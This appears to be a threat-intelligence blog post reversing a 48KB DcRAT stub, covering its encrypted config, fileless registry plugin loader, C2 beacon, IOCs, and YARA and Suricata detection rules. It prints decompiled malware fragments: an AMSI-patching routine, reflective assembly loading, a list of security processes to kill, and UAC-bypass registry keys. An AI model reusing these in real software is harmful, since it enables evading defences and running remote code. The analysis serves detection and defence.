---
title: "DcRAT in 48KB: Cracking the Config, Mapping the Plugin Loader, and Why the Stub IS the Malware"
permalink: /blog/dcrat-48kb-config-crack/
date: 2026-04-11 00:00:00 +0000
categories: [malware-reversing, threat-intel]
tags: [dcrat, dark-crystal-rat, dotnet, aes, pbkdf2, plugin-loader, amsi-bypass, yara, static-analysis, config-extraction]
image:
  path: /assets/images/social/dcrat-analysis-2026.jpg
description: "Reversing a 48KB DcRAT stub — cracking AES-256 encrypted config via PBKDF2 key derivation, mapping the fileless plugin architecture, and documenting why a minimal loader with zero offensive code scores 100/100 on CAPA."
---

Forty-eight kilobytes. That's less than a favicon. This .NET binary sat at the bottom of my triage queue with a CAPA score of 100/100 and a tag that said ".NET RAT indicators: encrypted_c2." I almost passed it over for a larger, flashier sample. Then I decompiled it and found something that reframed how I think about RAT analysis.

The binary has no keylogger. No file manager. No reverse shell. No screen capture. No browser stealer. No clipboard monitor. None of the capabilities that CAPA scored 100/100 for are actually implemented in the stub — they're all delivered as **plugin DLLs after the initial C2 connection**, cached in the Windows registry as binary blobs, and loaded reflectively into the same process without ever touching disk.

The stub's only job is to survive, persist, and load whatever the operator sends it. All 48 kilobytes are dedicated to exactly that: encrypted config, TLS socket, AMSI bypass, anti-VM check, process killer, BSOD protection, and a plugin loader. The malware IS the loader. Everything else is ephemeral.

This is [DcRAT](https://malpedia.caad.fkie.fraunhofer.de/details/win.dcrat) (Dark Crystal RAT) — a Malware-as-a-Service RAT that's been active since 2018 and saw a [massive surge in 2025](https://securelist.com/new-wave-of-attacks-with-dcrat-backdoor-distributed-by-maas/115850/) with 57+ new C2 domains. This post documents the full reversing: cracking the AES-256 encrypted config, extracting the C2 address, mapping the plugin architecture, and explaining why a binary with zero offensive code gets the maximum threat score.

---

## Sample

| Property | Value |
|---|---|
| **SHA-256** | `21117a9986e6c46e6ded575f875b254218d4d9b9588c1391fddf3b8b7cfa7e61` |
| **MD5** | (extracted from report) |
| **Size** | 48,640 bytes (47.5 KB) |
| **Format** | PE32 .NET assembly (x86, .NET Framework 4.0) |
| **Entropy** | `.text` section: 5.64 (normal — not packed) |
| **CAPA** | 100/100, RED ALERT |
| **Version** | 1.0.7.0 |

**Identification**: DcRAT (Dark Crystal RAT) v1.0.7, campaign group "update", C2 at `update35630[.]duckdns[.]org:35630`.

---

## Kill Chain

![DcRAT kill chain](/assets/images/posts/dcrat/1_killchain.png)
*Config decrypt → cert verify → anti-VM → mutex → AMSI bypass → TLS C2 connect → beacon → plugin dispatch loop*

---

## Cracking the Config

Every config field is AES-256-CBC encrypted with HMAC-SHA256 authentication. The key derivation uses PBKDF2 with a hardcoded salt that's become DcRAT's signature: `DcRatByqwqdanchun`.

```csharp
// From Aes256.cs — the DcRAT crypto signature
private static readonly byte[] Salt = Encoding.ASCII.GetBytes("DcRatByqwqdanchun");

public Aes256(string masterKey)
{
    using Rfc2898DeriveBytes kdf = new Rfc2898DeriveBytes(masterKey, Salt, 50000);
    _key = kdf.GetBytes(32);      // AES-256 key
    _authKey = kdf.GetBytes(64);  // HMAC-SHA256 auth key
}
```

The wire format for each encrypted field:

```
[HMAC-SHA256 (32 bytes)][IV (16 bytes)][AES-CBC ciphertext (PKCS7 padded)]
```

The master key is Base64-encoded in `Settings.Key`:

```
SExzRk9tZTVTenBLU1JEa0huSU4xQndzdTJzOXg3Tm8=
↓ Base64 decode
HLsFOme5SzpKSRDkHnIN1Bwsu2s9x7No
```

With this key and the PBKDF2 parameters, a Python script cracks the entire config:

```python
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
import base64

KEY = "HLsFOme5SzpKSRDkHnIN1Bwsu2s9x7No"
SALT = b"DcRatByqwqdanchun"
derived = PBKDF2(KEY, SALT, dkLen=96, count=50000)  # HMAC-SHA1 (default)
aes_key = derived[:32]

def decrypt(b64):
    raw = base64.b64decode(b64)
    iv = raw[32:48]       # skip HMAC, grab IV
    ct = raw[48:]         # ciphertext
    cipher = AES.new(aes_key, AES.MODE_CBC, iv)
    dec = cipher.decrypt(ct)
    return dec[:-dec[-1]].decode()  # PKCS7 unpad
```

### Decrypted Configuration

| Field | Encrypted (Base64) | Decrypted |
|---|---|---|
| **C2 Host** | `WT5Kqz1F9xJ+HQfLdBBg0n...` | `update35630[.]duckdns[.]org` |
| **C2 Port** | `tofjRrmWFl3qAKmJZC29WB...` | `35630` |
| **Version** | `bgkp8PfVZ09YN4eXvu+Iv...` | `1.0.7` |
| **Mutex** | `SmrPhYgAD5HylIvTTc4vU...` | `DcRatMutex_qwqdanchunl` |
| **Group** | `Ei/G+eC7tCu1LhuJBwSwd...` | `update` |
| **Install** | `FaDtXGD6jnOIc83tP9l7q...` | `false` |
| **BSOD** | `yEgcgKKmcMUA4jRNjnWtl...` | `false` |
| **Anti-VM** | `B78qSCvcxjOUc+/+lB9VB...` | `false` |
| **Anti-Process** | `HV1lRb3qZ2mL8fdiLE2Jb...` | `false` |
| **Pastebin** | `JkM8/1t3EP1rhch6vcm60...` | `null` |

The operator disabled every protection feature — anti-VM, anti-process, BSOD protection, and even the install/persistence mechanism. This is a **bare minimum deployment**: connect to C2, load plugins, nothing else. The 48KB size reflects this minimalism.

### Config Integrity Verification

After decrypting, the stub verifies the AES key's RSA-SHA256 signature against the embedded X509 server certificate:

```csharp
// From Settings.VerifyHash() — anti-tampering
RSACryptoServiceProvider rsa = (RSACryptoServiceProvider)Server_Certificate.PublicKey.Key;
using SHA256Managed sha = new SHA256Managed();
return rsa.VerifyHash(
    sha.ComputeHash(Encoding.UTF8.GetBytes(Key)),
    CryptoConfig.MapNameToOID("SHA256"),
    Convert.FromBase64String(Server_signa_ture));
```

If verification fails, the entire RAT exits — `return false` from `InitializeSettings()` triggers `Environment.Exit(0)` in `Program.Main()`. This prevents config tampering and ensures only the original operator's C2 server can control the implant.

---

## The Plugin Architecture: Why the Stub IS the Malware

![Plugin architecture](/assets/images/posts/dcrat/2_plugin_arch.png)
*C2 sends plugin → store in registry → decompress → reflective load → invoke Plugin.Plugin.Run()*

This is the core insight of this sample. The 48KB stub has **zero offensive capabilities**. Every feature analysts associate with DcRAT — keylogging, file theft, reverse shell, screen capture, webcam, browser password stealing — is delivered as a plugin DLL **after** the initial connection.

```csharp
// From ClientSocket.cs — the plugin dispatch
case "plu_gin":
    // Check if plugin hash exists in registry cache
    string hash = msgPack.ForcePathObject("Hash").AsString;
    byte[] cached = SetRegistry.GetValue(hash);
    if (cached == null) {
        // Request plugin from C2
        SendPluginRequest(hash);
    } else {
        // Load from cache — fileless execution
        Invoke(cached, msgPack);
    }
    break;

case "save_Plugin":
    // Store plugin DLL in registry for persistence
    string pluginHash = msgPack.ForcePathObject("Hash").AsString;
    byte[] pluginBytes = msgPack.ForcePathObject("Plugin").GetAsBytes();
    SetRegistry.SetValue(pluginHash, pluginBytes);  // HKCU\Software\<HWID>\<hash>
    break;
```

The plugin invocation uses standard .NET reflection:

```csharp
// From ClientSocket.Invoke() — reflective assembly loading
Assembly assembly = AppDomain.CurrentDomain.Load(Zip.Decompress(pluginBytes));
Type pluginType = assembly.GetType("Plugin.Plugin");
object instance = Activator.CreateInstance(pluginType);
pluginType.GetMethod("Run").Invoke(instance, new object[] {
    socket,              // live C2 connection
    ServerCertificate,   // for authenticated comms
    Settings.Hw_id,      // victim identifier
    msgPackData,         // command parameters
    mutexHandle,         // instance lock
    Settings.MTX,        // mutex name
    Settings.BS_OD,      // BSOD flag
    Settings.In_stall    // install flag
});
```

**Fileless persistence**: plugins are stored as GZip-compressed binary blobs in `HKCU\Software\<HWID>\<hash>`. They never touch the filesystem. On subsequent connections, the C2 sends the hash and the stub loads the plugin directly from the registry — no re-download needed.

[Kaspersky's research](https://securelist.com/new-wave-of-attacks-with-dcrat-backdoor-distributed-by-maas/115850/) has documented **34+ distinct DcRAT plugins** including keylogger, webcam capture, file theft, password exfiltration, clipboard monitoring, reverse shell, and ransomware. None of these were present in this sample — they would have been delivered post-compromise.

---

## AMSI Bypass

The `Amsi.cs` class patches `AmsiScanBuffer` in memory using dynamically resolved APIs. The function and DLL names are Base64-encoded to avoid string-based detection:

```csharp
// From Amsi.cs — all strings Base64-encoded
IntPtr hModule = Win32.LoadLibraryA(
    Convert.FromBase64String("YW1zaS5kbGw="));          // "amsi.dll"
IntPtr pFunc = Win32.GetProcAddress(hModule,
    Convert.FromBase64String("QW1zaVNjYW5CdWZmZXI="));  // "AmsiScanBuffer"
Win32.VirtualProtect(pFunc, size, 0x40, out oldProtect); // PAGE_EXECUTE_READWRITE

// x64 patch: mov eax, 0xDD070057; ret
// x86 patch: mov eax, 0x07005700; ret 0x18
Marshal.Copy(patch, 0, pFunc, patch.Length);
```

Note the **deliberate variable name misdirection** in `Win32.cs`: the field named `VirtualAllocEx` is actually a delegate to `VirtualProtect`. An analyst doing quick grep-based analysis for `VirtualAllocEx` would find a false positive while missing the real `VirtualProtect` call.

---

## Anti-Process Kill List

When `Anti_Process` is enabled (disabled in this build), a background thread terminates 13 security and analysis tools every 50ms:

| Process | Tool |
|---|---|
| `Taskmgr.exe` | Task Manager |
| `ProcessHacker.exe` | Process Hacker |
| `procexp.exe` | Process Explorer |
| `MSASCui.exe` | Windows Defender GUI |
| `MsMpEng.exe` | Windows Defender engine |
| `MpCmdRun.exe` | Defender CLI |
| `NisSrv.exe` | Defender NIS |
| `MSConfig.exe` | System Configuration |
| `Regedit.exe` | Registry Editor |
| `taskkill.exe` | taskkill command itself |

Uses `CreateToolhelp32Snapshot` → `Process32First/Next` → `OpenProcess(PROCESS_TERMINATE)` → `TerminateProcess` — all via direct P/Invoke.

---

## C2 Beacon

On first connection, the stub sends a `ClientInfo` MsgPack packet with:

| Field | Value |
|---|---|
| HWID | MD5-based hardware fingerprint |
| User | `Environment.UserName` |
| OS | Full name + architecture |
| Camera | Webcam detected (boolean) |
| Path | Executable location |
| Version | `1.0.7` |
| Admin | Privilege level |
| Perfor_mance | Current foreground window title |
| Anti_virus | Installed AV products |
| Group | `update` |

The keepalive ping (every 10-15 seconds, randomized) includes the current **foreground window title** — providing passive surveillance of what the victim is doing, even without a keylogger plugin loaded.

---

## Obfuscation Techniques

The stub uses no packer or code-level obfuscator (no ConfuserEx, no Dotfuscator) — the class and method names are plaintext. Instead, it relies on **string-level obfuscation** layered across multiple techniques:

| # | Technique | Example | Purpose |
|---|---|---|---|
| 1 | **AES-256 config encryption** | All config fields are `PBKDF2 → AES-CBC → Base64` | Hides C2 address, mutex, group from static scanners |
| 2 | **Base64 API names** | `YW1zaS5kbGw=` → `amsi.dll` | Hides AMSI/VirtualProtect strings from YARA |
| 3 | **Base64 commands** | `L2Mgc2NodGFza3M...` → `/c schtasks /create...` | Hides persistence commands |
| 4 | **Variable name misdirection** | `VirtualAllocEx` field → actually resolves to `VirtualProtect` | Tricks grep-based analysts |
| 5 | **Underscore-split field names** | `Hos_ts`, `Por_ts`, `BS_OD`, `An_ti` | Breaks regex matching for "Hosts", "Ports", "BSOD" |
| 6 | **RSA signature verification** | SHA256 of key verified against X509 cert | Anti-tampering — RAT exits if config was modified |
| 7 | **GZip + MsgPack wire encoding** | All C2 traffic double-wrapped | Hides command structure from network inspection |

The underscore trick is subtle — a YARA rule looking for `"Hosts"` or `"Ports"` won't match `"Hos_ts"` or `"Por_ts"`. Similarly, `"BSOD"` doesn't match `"BS_OD"`. These aren't random names — they're deliberately split to evade string signatures while remaining readable to the developer.

---

## No Process Injection — But Fileless Execution Via Reflection

The stub contains **no process injection code** — no `VirtualAllocEx`, no `WriteProcessMemory`, no `CreateRemoteThread`, no process hollowing. The only memory manipulation is the AMSI `VirtualProtect` patch.

However, the plugin system achieves **in-process fileless execution** via .NET reflection:

```csharp
// Not injection — but equally dangerous
Assembly asm = AppDomain.CurrentDomain.Load(Zip.Decompress(pluginBytes));
Type t = asm.GetType("Plugin.Plugin");
Activator.CreateInstance(t).GetMethod("Run").Invoke(...);
```

Plugin DLLs never touch disk — they're stored in the registry and loaded directly into the stub's process space. From a detection perspective, this is harder to catch than traditional injection because there's no cross-process memory write to hook.

---

## Code Weaknesses and Defensive Opportunities

### Certificate Is Extractable — MITM the C2

The X509 server certificate is embedded in the binary (Base64 in `Settings.Certifi_cate`). A defender who extracts the encrypted cert, decrypts it with the known AES key, and imports it can impersonate the C2 server. The `ValidateServerCertificate` callback compares against this embedded cert — if you present the same cert, the TLS handshake succeeds.

### Plugin System Has No Code Signing

`AppDomain.CurrentDomain.Load()` accepts any valid .NET assembly — no hash verification, no Authenticode check, no code signing. A C2 impersonator can push a cleanup plugin that removes persistence, deletes registry caches, and terminates the RAT.

### Anti-VM Is Trivially Bypassable

The only VM detection is WMI `Win32_CacheMemory` returning 0 entries. This is one of the weakest anti-VM checks available — most modern analysis VMs report cache memory correctly. Even those that don't can be patched with a single WMI provider override.

### HWID Is Predictable — Plugin Cache Is Findable

The hardware ID is `MD5(ProcessorCount + UserName + MachineName + OSVersion + SystemDriveTotalSize)[:20]`. All inputs are available to any process. An incident responder can compute the HWID and directly navigate to `HKCU\Software\<HWID>` to find cached plugin DLLs — even if the rootkit is active.

### Keepalive Leaks Activity to Any MITM

Every 10-15 seconds, the ping packet includes the victim's **foreground window title** in plaintext (inside the TLS tunnel). A defender who MITMs the connection (using the extracted cert) gets a real-time feed of what the victim sees on screen — effectively turning the RAT's surveillance against the operator.

### Cleanup Registry Reveals UAC Bypass Techniques

`Methods.ClearSetting()` deletes three specific registry keys:

```csharp
// From Methods.cs — cleanup reveals the attack playbook
Registry.CurrentUser.DeleteSubKey("Environment\\windir");         // eventvwr.exe bypass
Registry.CurrentUser.DeleteSubKey("Software\\Classes\\mscfile");  // CompMgmtLauncher bypass
Registry.CurrentUser.DeleteSubKey("Software\\Classes\\ms-settings"); // fodhelper.exe bypass
```

The stub cleans up after UAC bypass plugins — but the cleanup code itself reveals exactly which three UAC bypass techniques the operator's plugin toolkit uses. A defender can preemptively monitor these registry paths as early-warning indicators.

---

## IOC Appendix

### Network Indicators

| Type | Value | Context |
|---|---|---|
| Domain | `update35630[.]duckdns[.]org` | C2 server (DuckDNS DDNS) |
| Port | `35630/tcp` | C2 port (TLS) |

### Host Indicators

| Type | Value | Context |
|---|---|---|
| Mutex | `DcRatMutex_qwqdanchunl` | Single instance lock |
| Registry | `HKCU\Software\<HWID>` | Plugin cache (fileless) |
| Salt | `DcRatByqwqdanchun` | PBKDF2 salt (DcRAT signature) |
| AES Key | `HLsFOme5SzpKSRDkHnIN1Bwsu2s9x7No` | Config decryption master key |

### File Hash

| Hash | Value |
|---|---|
| SHA-256 | `21117a9986e6c46e6ded575f875b254218d4d9b9588c1391fddf3b8b7cfa7e61` |

### MITRE ATT&CK Mapping

| ID | Technique | Evidence |
|---|---|---|
| T1059.001 | PowerShell | Base64-encoded commands in persistence |
| T1053.005 | Scheduled Task | Admin persistence via `schtasks /create` |
| T1547.001 | Registry Run Keys | User persistence via `HKCU\...\Run` |
| T1140 | Deobfuscate/Decode | AES-256 config decryption, Base64 API names |
| T1562.001 | Disable or Modify Tools | AMSI bypass, analysis tool killer (13 processes) |
| T1497 | Virtualization/Sandbox Evasion | WMI `Win32_CacheMemory` VM detection |
| T1106 | Native API | P/Invoke for process termination, AMSI patching |
| T1620 | Reflective Code Loading | `AppDomain.Load()` for plugin DLLs from registry |
| T1112 | Modify Registry | Plugin storage in `HKCU\Software\<HWID>` |
| T1071 | Application Layer Protocol | MsgPack + GZip over TLS |
| T1573 | Encrypted Channel | TLS with certificate pinning |

---

## Reproducible Extraction

The config extraction script automates the full AES decryption pipeline:

```python
#!/usr/bin/env python3
"""DcRAT Config Extractor — decrypts all AES-256 config fields."""
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
import base64

# DcRAT-specific constants
SALT = b"DcRatByqwqdanchun"
ITERATIONS = 50000

def crack_dcrat(master_key, encrypted_fields):
    """Decrypt DcRAT config given the master key and encrypted field values."""
    derived = PBKDF2(master_key, SALT, dkLen=96, count=ITERATIONS)
    aes_key = derived[:32]  # first 32 bytes = AES-256 key

    for name, b64_value in encrypted_fields.items():
        raw = base64.b64decode(b64_value)
        # Wire format: [HMAC-SHA256 (32)][IV (16)][AES-CBC ciphertext]
        iv = raw[32:48]
        ciphertext = raw[48:]
        cipher = AES.new(aes_key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(ciphertext)
        plaintext = decrypted[:-decrypted[-1]].decode()  # PKCS7 unpad
        print(f"  {name:15s} = {plaintext}")
```

Full script available in the [analysis bundle](https://github.com/taogoldi/analysis_data/tree/main/dcrat_v107_apr_2026/scripts).

Usage:
```bash
python extract_dcrat_config.py sample.exe --key "HLsFOme5SzpKSRDkHnIN1Bwsu2s9x7No"
```

---

## Detection

### YARA Rules

Two rules targeting this sample and the DcRAT family. Full file: [`rats/dcrat/dcrat_v107.yar`](https://github.com/taogoldi/YARA/blob/main/rats/dcrat/dcrat_v107.yar)

**Rule 1 — Campaign-specific (this build):**

```yara
rule DcRAT_Config_Update35630
{
    meta:
        description = "Detects this specific DcRAT build targeting update35630.duckdns.org"
        author = "Tao Goldi"
        date = "2026-04"
        sha256 = "21117a9986e6c46e6ded575f875b254218d4d9b9588c1391fddf3b8b7cfa7e61"
        severity = "critical"
        family = "DcRAT"

    strings:
        $key = "SExzRk9tZTVTenBLU1JEa0huSU4xQndzdTJzOXg3Tm8=" ascii wide
        $mutex_enc = "SmrPhYgAD5HylIvTTc4vUYeqfyukZO6y0l91cJgEBCRGN6QUWN" ascii wide
        $host_enc = "WT5Kqz1F9xJ+HQfLdBBg0nU4iSQL6i2Jc17coZD6434zPQsBlUu7Rlo3" ascii wide
        $salt = "DcRatByqwqdanchun" ascii wide
        $net = "mscoree.dll" ascii

    condition:
        uint16(0) == 0x5A4D and $net and
        (($key and $salt) or ($host_enc and $salt) or ($key and $mutex_enc))
}
```

**Rule 2 — Generic DcRAT family:**

```yara
rule DcRAT_Generic
{
    meta:
        description = "Generic DcRAT / Dark Crystal RAT family detection"
        author = "Tao Goldi"
        date = "2026-04"
        severity = "high"
        family = "DcRAT"

    strings:
        $salt = "DcRatByqwqdanchun" ascii wide
        $mutex_prefix = "DcRatMutex_" ascii wide
        $ns1 = "Client.Algorithm" ascii wide
        $ns2 = "Client.Connection" ascii wide
        $ns3 = "Client.Helper" ascii wide
        $ns4 = "Client.Install" ascii wide
        $msgpack = "MessagePackLib" ascii wide
        $pong = "Po_ng" ascii wide
        $plugin = "plu_gin" ascii wide
        $save = "save_Plugin" ascii wide
        $net = "mscoree.dll" ascii

    condition:
        uint16(0) == 0x5A4D and $net and
        ($salt or $mutex_prefix or (3 of ($ns*) and $msgpack) or ($pong and $plugin and $save))
}
```

### Suricata

```
alert tls $HOME_NET any -> $EXTERNAL_NET 35630 (
    msg:"MALWARE DcRAT C2 beacon (TLS on non-standard port)";
    flow:established,to_server;
    tls.sni; content:"duckdns.org";
    sid:2026046; rev:1;
)
```

---

## Conclusion

This sample is a masterclass in minimalist malware design. At 48KB, it's smaller than most legitimate DLLs — yet it scores 100/100 on CAPA because the **potential** for harm is built into its architecture, not its code. The stub is a delivery mechanism for a modular RAT ecosystem with [34+ documented plugins](https://securelist.com/new-wave-of-attacks-with-dcrat-backdoor-distributed-by-maas/115850/) that provide every offensive capability an operator needs.

The DuckDNS C2 at `update35630[.]duckdns[.]org:35630` follows DcRAT's documented operational pattern — [Kaspersky identified 57+ new DcRAT domains in 2025 alone](https://securelist.com/new-wave-of-attacks-with-dcrat-backdoor-distributed-by-maas/115850/), many using dynamic DNS services. The "update" group tag and disabled protection features suggest this is either a test build or a targeted deployment where stealth mattered more than resilience.

For defenders: the PBKDF2 salt `DcRatByqwqdanchun` is a high-fidelity family indicator — it's hardcoded in the `Aes256.cs` source and present in every DcRAT build. The mutex prefix `DcRatMutex_` is equally reliable. And the fileless plugin storage in `HKCU\Software\<HWID>` means forensic investigators should always check for binary registry values under user-accessible hives.

---

*Tools used: ILSpy (decompilation), pycryptodome (AES/PBKDF2 decryption), custom Python config extractor. Family identification confirmed via PBKDF2 salt and [Malpedia DcRAT entry](https://malpedia.caad.fkie.fraunhofer.de/details/win.dcrat). Campaign context from [Kaspersky Securelist](https://securelist.com/new-wave-of-attacks-with-dcrat-backdoor-distributed-by-maas/115850/) and [ANY.RUN DcRAT trends](https://any.run/malware-trends/dcrat/).*
